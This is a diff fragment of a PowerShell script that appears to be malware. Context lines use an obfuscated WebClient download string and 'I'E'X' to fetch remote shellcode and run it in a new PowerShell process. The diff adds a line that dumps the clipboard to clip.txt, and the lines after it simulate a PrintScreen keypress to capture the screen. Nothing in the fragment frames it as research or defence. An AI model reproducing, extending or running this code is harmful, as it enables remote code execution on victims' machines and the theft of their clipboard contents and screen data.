@@ -9,6 +9,8 @@ $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 $proc.WaitForExit()
 
+Get-Clipboard | Out-File -FilePath "clip.txt" -Encoding utf8
+
 Add-Type -AssemblyName System.Windows.Forms
 [System.Windows.Forms.SendKeys]::SendWait('{PRTSC}')
 Start-Sleep -Milliseconds 500
